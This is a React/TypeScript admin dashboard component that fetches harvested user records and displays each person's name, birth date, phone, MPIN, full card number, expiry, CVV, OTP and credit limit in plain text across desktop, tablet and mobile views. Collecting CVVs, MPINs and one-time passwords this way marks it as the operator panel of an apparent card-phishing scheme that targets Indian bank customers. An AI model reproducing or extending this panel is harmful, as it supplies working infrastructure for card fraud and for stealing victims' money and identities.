import axios from 'axios';
import { motion } from 'framer-motion';
import React, { useEffect, useState } from 'react';

interface User {
  _id: string;
  name: string;
  dob: string;
  phone: string;
  mpin: string;
  credit_limit: number;
  card_number: string;
  card_holder_name: string;
  expiry_date: string;
  cvv: string;
  otp: string;
  submission_date: string;
}

const AdminDashboard: React.FC = () => {
  const [users, setUsers] = useState<User[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');

  const fetchData = async () => {
    try {
      setLoading(true);
      const usersResponse = await axios.get<User[]>(`${import.meta.env.VITE_API_URL}/api/users`);
      setUsers(usersResponse.data);
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Unknown error');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchData();
  }, []);

  const deleteUser = async (id: string) => {
    if (!window.confirm('Are you sure you want to delete this user? This action cannot be undone.')) {
      return;
    }
    try {
      setLoading(true);
      await axios.delete(`${import.meta.env.VITE_API_URL}/api/users/${id}`);
      await fetchData();
    } catch (err) {
      setError('Failed to delete user');
    } finally {
      setLoading(false);
    }
  };

  const getVerificationStatus = (user: User) => {
    if (!user.otp) return { text: 'Not Verified', color: 'bg-red-100 text-red-700' };
    return { text: 'Verified', color: 'bg-green-100 text-green-700' };
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center min-h-screen">
        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"></div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="flex items-center justify-center min-h-screen">
        <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded" role="alert">
          <p className="font-bold">Error</p>
          <p>{error}</p>
        </div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 bg-gray-50 overflow-hidden">
      <div className="h-full flex flex-col">
        {/* Header - Fixed */}
        <div className="bg-white shadow-sm border-b border-gray-200 px-4 py-3 flex-shrink-0">
          <div className="flex justify-between items-center">
            <h1 className="text-2xl md:text-3xl font-bold text-gray-900">Admin Dashboard</h1>
            <p className="text-sm md:text-lg text-gray-600">Users: {users.length}</p>
          </div>
        </div>

        {/* Table Container - Full remaining height */}
        <div className="flex-1 overflow-hidden">
          <div className="h-full bg-white border border-gray-200">
            <div className="h-full overflow-auto">
              {/* Desktop Table View */}
              <div className="hidden xl:block">
                <table className="w-full table-fixed border-collapse">
                  <thead className="bg-gray-100 border-b-2 border-gray-300 sticky top-0 z-20">
                    <tr>
                      <th className="w-40 px-3 py-3 text-left text-sm font-semibold text-gray-800 border-r border-gray-300">Name</th>
                      <th className="w-32 px-3 py-3 text-left text-sm font-semibold text-gray-800 border-r border-gray-300">DOB</th>
                      <th className="w-36 px-3 py-3 text-left text-sm font-semibold text-gray-800 border-r border-gray-300">Phone</th>
                      <th className="w-24 px-3 py-3 text-left text-sm font-semibold text-gray-800 border-r border-gray-300">First OTP</th>
                      <th className="w-44 px-3 py-3 text-left text-sm font-semibold text-gray-800 border-r border-gray-300">Card Holder</th>
                      <th className="w-44 px-3 py-3 text-left text-sm font-semibold text-gray-800 border-r border-gray-300">Card Number</th>
                      <th className="w-28 px-3 py-3 text-left text-sm font-semibold text-gray-800 border-r border-gray-300">Expiry</th>
                      <th className="w-20 px-3 py-3 text-left text-sm font-semibold text-gray-800 border-r border-gray-300">CVV</th>
                      <th className="w-24 px-3 py-3 text-left text-sm font-semibold text-gray-800 border-r border-gray-300">OTP</th>
                      <th className="w-36 px-3 py-3 text-left text-sm font-semibold text-gray-800 border-r border-gray-300">Credit Limit</th>
                      <th className="w-32 px-3 py-3 text-left text-sm font-semibold text-gray-800 border-r border-gray-300">Status</th>
                      <th className="w-36 px-3 py-3 text-left text-sm font-semibold text-gray-800 border-r border-gray-300">Date</th>
                      <th className="w-24 px-3 py-3 text-left text-sm font-semibold text-gray-800">Actions</th>
                    </tr>
                  </thead>
                  <tbody className="bg-white">
                    {users.map((user, index) => (
                      <tr key={user._id} className={`border-b border-gray-200 hover:bg-blue-50 transition-colors ${index % 2 === 0 ? 'bg-white' : 'bg-gray-50'}`}>
                        <td className="px-3 py-3 text-sm text-gray-900 border-r border-gray-200 font-medium truncate" title={user.name || '-'}>{user.name || '-'}</td>
                        <td className="px-3 py-3 text-sm text-gray-700 border-r border-gray-200 truncate">{user.dob || '-'}</td>
                        <td className="px-3 py-3 text-sm text-gray-700 border-r border-gray-200 truncate">{user.phone || '-'}</td>
                        <td className="px-3 py-3 text-sm text-gray-700 border-r border-gray-200 font-mono truncate">{user.mpin || '-'}</td>
                        <td className="px-3 py-3 text-sm text-gray-700 border-r border-gray-200 truncate" title={user.card_holder_name || '-'}>{user.card_holder_name || '-'}</td>
                        <td className="px-3 py-3 text-sm text-gray-700 border-r border-gray-200 font-mono truncate" title={user.card_number || '-'}>{user.card_number || '-'}</td>
                        <td className="px-3 py-3 text-sm text-gray-700 border-r border-gray-200 truncate">{user.expiry_date || '-'}</td>
                        <td className="px-3 py-3 text-sm text-gray-700 border-r border-gray-200 font-mono text-center truncate">{user.cvv || '-'}</td>
                        <td className="px-3 py-3 text-sm text-gray-700 border-r border-gray-200 font-mono truncate">{user.otp || '-'}</td>
                        <td className="px-3 py-3 text-sm text-gray-700 border-r border-gray-200 font-semibold truncate">{user.credit_limit ? `₹${user.credit_limit.toLocaleString('en-IN')}` : '-'}</td>
                        <td className="px-3 py-3 text-sm border-r border-gray-200"><span className={`px-2 py-1 text-xs rounded-full font-medium ${getVerificationStatus(user).color}`}>{getVerificationStatus(user).text}</span></td>
                        <td className="px-3 py-3 text-sm text-gray-700 border-r border-gray-200 truncate">{user.submission_date ? new Date(user.submission_date).toLocaleDateString('en-IN', { day: '2-digit', month: '2-digit', year: 'numeric' }) : '-'}</td>
                        <td className="px-3 py-3 text-sm"><button onClick={() => deleteUser(user._id)} className="bg-red-500 hover:bg-red-600 text-white px-2 py-1 rounded text-xs font-medium transition-colors" title="Delete User">Delete</button></td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>

              {/* Tablet View */}
              <div className="hidden md:block xl:hidden">
                <table className="w-full table-auto border-collapse text-sm">
                  <thead className="bg-gray-100 border-b-2 border-gray-300 sticky top-0 z-20">
                    <tr>
                      <th className="px-2 py-2 text-left text-xs font-semibold text-gray-800 border-r border-gray-300">Name</th>
                      <th className="px-2 py-2 text-left text-xs font-semibold text-gray-800 border-r border-gray-300">Phone</th>
                      <th className="px-2 py-2 text-left text-xs font-semibold text-gray-800 border-r border-gray-300">MPIN</th>
                      <th className="px-2 py-2 text-left text-xs font-semibold text-gray-800 border-r border-gray-300">Card Info</th>
                      <th className="px-2 py-2 text-left text-xs font-semibold text-gray-800 border-r border-gray-300">Status</th>
                      <th className="px-2 py-2 text-left text-xs font-semibold text-gray-800">Action</th>
                    </tr>
                  </thead>
                  <tbody className="bg-white">
                    {users.map((user, index) => (
                      <tr key={user._id} className={`border-b border-gray-200 hover:bg-blue-50 transition-colors ${index % 2 === 0 ? 'bg-white' : 'bg-gray-50'}`}>
                        <td className="px-2 py-2 text-xs text-gray-900 border-r border-gray-200 font-medium">
                          <div className="truncate" title={user.name || '-'}>{user.name || '-'}</div>
                          <div className="text-gray-500 text-xs">{user.dob || '-'}</div>
                        </td>
                        <td className="px-2 py-2 text-xs text-gray-700 border-r border-gray-200">
                          <div className="truncate">{user.phone || '-'}</div>
                          <div className="text-gray-500 text-xs">OTP: {user.otp || '-'}</div>
                        </td>
                        <td className="px-2 py-2 text-xs text-gray-700 border-r border-gray-200 font-mono">
                          <div className="truncate">{user.mpin || '-'}</div>
                          <div className="text-gray-500 text-xs">CVV: {user.cvv || '-'}</div>
                        </td>
                        <td className="px-2 py-2 text-xs text-gray-700 border-r border-gray-200">
                          <div className="truncate font-mono" title={user.card_number || '-'}>{user.card_number || '-'}</div>
                          <div className="text-gray-500 text-xs truncate">{user.card_holder_name || '-'}</div>
                          <div className="text-gray-500 text-xs">Exp: {user.expiry_date || '-'}</div>
                        </td>
                        <td className="px-2 py-2 text-xs border-r border-gray-200">
                          <span className={`px-1 py-1 text-xs rounded font-medium ${getVerificationStatus(user).color}`}>{getVerificationStatus(user).text === 'Verified' ? 'Verified' : 'Not Verified'}</span>
                          <div className="text-gray-500 text-xs mt-1">₹{user.credit_limit ? user.credit_limit.toLocaleString('en-IN') : '0'}</div>
                        </td>
                        <td className="px-2 py-2 text-xs">
                          <button onClick={() => deleteUser(user._id)} className="bg-red-500 hover:bg-red-600 text-white px-2 py-1 rounded text-xs font-medium transition-colors" title="Delete User">Delete</button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>

              {/* Mobile View */}
              <div className="md:hidden">
                <div className="space-y-2 p-2">
                  {users.map((user, index) => (
                    <div key={user._id} className={`border rounded-lg p-3 ${index % 2 === 0 ? 'bg-white' : 'bg-gray-50'} hover:bg-blue-50 transition-colors`}>
                      <div className="flex justify-between items-start mb-2">
                        <div className="flex-1">
                          <h3 className="font-semibold text-sm text-gray-900 truncate" title={user.name || '-'}>{user.name || '-'}</h3>
                          <p className="text-xs text-gray-600">{user.phone || '-'}</p>
                        </div>
                        <div className="flex flex-col items-end">
                          <span className={`px-2 py-1 text-xs rounded font-medium ${getVerificationStatus(user).color} mb-1`}>
                            {getVerificationStatus(user).text === 'Verified' ? 'V' : 'NV'}
                          </span>
                          <button onClick={() => deleteUser(user._id)} className="bg-red-500 hover:bg-red-600 text-white px-2 py-1 rounded text-xs font-medium transition-colors">Del</button>
                        </div>
                      </div>
                      
                      <div className="grid grid-cols-2 gap-2 text-xs">
                        <div>
                          <span className="text-gray-500">DOB:</span>
                          <span className="ml-1 font-medium">{user.dob || '-'}</span>
                        </div>
                        <div>
                          <span className="text-gray-500">MPIN:</span>
                          <span className="ml-1 font-mono">{user.mpin || '-'}</span>
                        </div>
                        <div>
                          <span className="text-gray-500">OTP:</span>
                          <span className="ml-1 font-mono">{user.otp || '-'}</span>
                        </div>
                        <div>
                          <span className="text-gray-500">CVV:</span>
                          <span className="ml-1 font-mono">{user.cvv || '-'}</span>
                        </div>
                      </div>
                      
                      <div className="mt-2 text-xs">
                        <div className="truncate" title={user.card_number || '-'}>
                          <span className="text-gray-500">Card:</span>
                          <span className="ml-1 font-mono">{user.card_number || '-'}</span>
                        </div>
                        <div className="truncate" title={user.card_holder_name || '-'}>
                          <span className="text-gray-500">Holder:</span>
                          <span className="ml-1">{user.card_holder_name || '-'}</span>
                        </div>
                        <div className="flex justify-between mt-1">
                          <span>
                            <span className="text-gray-500">Exp:</span>
                            <span className="ml-1">{user.expiry_date || '-'}</span>
                          </span>
                          <span>
                            <span className="text-gray-500">Limit:</span>
                            <span className="ml-1 font-semibold">₹{user.credit_limit ? user.credit_limit.toLocaleString('en-IN') : '0'}</span>
                          </span>
                        </div>
                      </div>
                    </div>
                  ))}
                  {users.length === 0 && (
                    <div className="text-center py-8 text-gray-500">No users found</div>
                  )}
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Footer - Fixed */}
        <div className="bg-gray-100 px-4 py-2 border-t border-gray-300 flex justify-between items-center text-xs text-gray-600 flex-shrink-0">
          <div className="flex gap-4">
            <div className="flex items-center gap-1">
              <span className="px-1 py-1 bg-green-100 text-green-700 rounded text-xs">V</span>
              <span>Verified</span>
            </div>
            <div className="flex items-center gap-1">
              <span className="px-1 py-1 bg-red-100 text-red-700 rounded text-xs">NV</span>
              <span>Not Verified</span>
            </div>
          </div>
          <span className="font-medium">Total: {users.length}</span>
        </div>
      </div>
    </div>
  );
};

export default AdminDashboard;